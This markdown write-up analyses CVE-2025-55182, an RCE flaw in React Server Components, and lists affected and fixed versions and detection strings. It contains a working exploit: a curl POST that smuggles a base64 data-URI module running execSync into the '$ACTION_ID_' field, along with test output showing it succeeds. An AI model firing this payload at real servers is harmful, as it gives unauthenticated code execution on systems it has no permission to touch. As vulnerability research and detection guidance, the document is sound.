# CVE-2025-55182 Analysis Summary

## Executive Summary

CVE-2025-55182 is a **critical RCE vulnerability** (CVSS 10.0) in React Server Components. The **real exploitation mechanism** uses Node.js data URI imports via `decodeAction`, NOT the Function constructor path initially investigated.

## The REAL Exploit (Confirmed Working)

### Attack Vector

The vulnerable **unbundled** version of `react-server-dom-webpack` contains this code flow:

```javascript
// 1. resolveServerReference - NO VALIDATION on the ID!
function resolveServerReference(bundlerConfig, id) {
  var idx = id.lastIndexOf("#");
  var specifier = id.slice(0, idx);
  var name = id.slice(idx + 1);
  return { specifier: specifier, name: name };  // Just parses, no manifest check!
}

// 2. preloadModule - RAW IMPORT!
async function preloadModule(metadata) {
  var modulePromise = import(metadata.specifier);  // Attacker-controlled!
  // ...
}
```

### Exploit Payload

```bash
# Craft malicious JavaScript module
payload="data:text/javascript;base64,$(printf 'import{execSync}from"node:child_process";execSync("id>/tmp/pwned");export default()=>"ok";' | base64)"

# Send via multipart POST
curl -F "\$ACTION_ID_${payload}=ignored" http://target:3000/
```

### Why It Works

1. `$ACTION_ID_` prefix triggers action handling in `decodeAction`
2. The action ID (everything after `$ACTION_ID_`) is passed to `loadServerReference`
3. `resolveServerReference` extracts the specifier from the ID - **no validation!**
4. `preloadModule` calls `import(specifier)` directly
5. Node.js evaluates `data:text/javascript;base64,...` as an ES module
6. **RCE occurs during import!** - Before any application code runs

### Key Insight: Bundled vs Unbundled

| Version | resolveServerReference | preloadModule | RCE? |
|---------|----------------------|---------------|------|
| **Bundled** | Checks `bundlerConfig[id]` | Uses `__webpack_require__` | ✗ |
| **Unbundled** | Just parses `id.split('#')` | Uses raw `import()` | ✓ |

Next.js and other RSC implementations may use the unbundled version internally, making them vulnerable.

## Verified Test Results

```
$ node test-real-exploit.cjs

[4] Executing exploit:

    Parsed reference:
      specifier: data:text/javascript;base64,CmltcG9ydCB7IGV4ZWNTeW...
      name: default

[RCE] Triggered during module import!
[RCE] whoami = nick

[5] Module loaded!
    Module: [Module: null prototype] { default: [Function: action] }
    Calling module.default(): Pwned by: nick
```

## Earlier Investigation: Prototype Chain Traversal

Before discovering the data URI path, we investigated the `getOutlinedModel()` vulnerability:

### The Prototype Chain Path (NOT the real exploit)

```javascript
// Vulnerable code in getOutlinedModel:
for (key = 1; key < reference.length; key++)
  parentObject = parentObject[reference[key]];  // No hasOwnProperty check!

// Payload: "$1:constructor:constructor" traverses to Function
```

This CAN get access to `Function`, but has problems:
- `.then = Function` fails because V8 passes native functions
- `decodeAction` always appends `formData` breaking the call

**This path does NOT lead to RCE** without additional gadgets.

## Affected Versions

- React RSC: 19.0.0, 19.1.0, 19.1.1, 19.2.0
- Next.js App Router: 15.x, 16.x (before patches)
- Next.js Canaries: from 14.3.0-canary.77+

## Fixed Versions

- React: 19.0.1+, 19.1.2+, 19.2.1+
- Next.js: 15.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7+

## Detection

Look for HTTP POST requests containing:
- `$ACTION_ID_data:`
- `$ACTION_ID_node:`
- `$ACTION_ID_file:`
- `$ACTION_REF_*` with similar patterns

## Key Takeaways

1. **The vulnerability is trivially exploitable** against unbundled RSC
2. **No authentication required** - just POST to any RSC endpoint
3. **RCE happens during deserialization** - before any app code
4. **The Function constructor path we investigated is a dead end**
5. **The data URI import is the real attack vector**

## Files Created

| File | Purpose |
|------|---------|
| `test-data-uri-import.cjs` | Proves Node.js evaluates data URI imports |
| `test-real-exploit.cjs` | Demonstrates full exploit chain |
| `test-decodeaction-flow.cjs` | Analysis of why Function path fails |
| `test-outlined-model-rce.cjs` | Tests prototype traversal path |
| `test-proto-pollution.cjs` | Prototype pollution attempts |
| `test-native-fn-strings.cjs` | Why thenable path fails |

## References

- https://qideng.substack.com/p/react2shell-rce-in-react-server-components
- https://github.com/msanft/CVE-2025-55182
